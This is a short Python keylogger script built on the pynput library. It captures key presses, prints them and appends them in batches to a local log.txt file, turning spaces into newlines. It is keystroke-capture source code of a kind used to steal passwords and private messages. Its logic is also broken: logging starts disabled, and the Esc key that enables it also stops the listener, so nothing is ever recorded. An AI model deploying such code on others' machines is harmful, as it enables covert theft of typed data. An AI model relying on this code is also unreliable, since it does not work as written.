from pynput import keyboard

logging = False
keys = []
count = 0

def on_press(key):
    global keys, count, logging

    if logging:
        keys.append(key)
        count += 1
        print("{0} pressed".format(key))

        if count >= 10:
            count = 0
            write_file(keys)
            keys = []

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")

            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    global logging

    if key == keyboard.Key.esc:
        logging = not logging
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
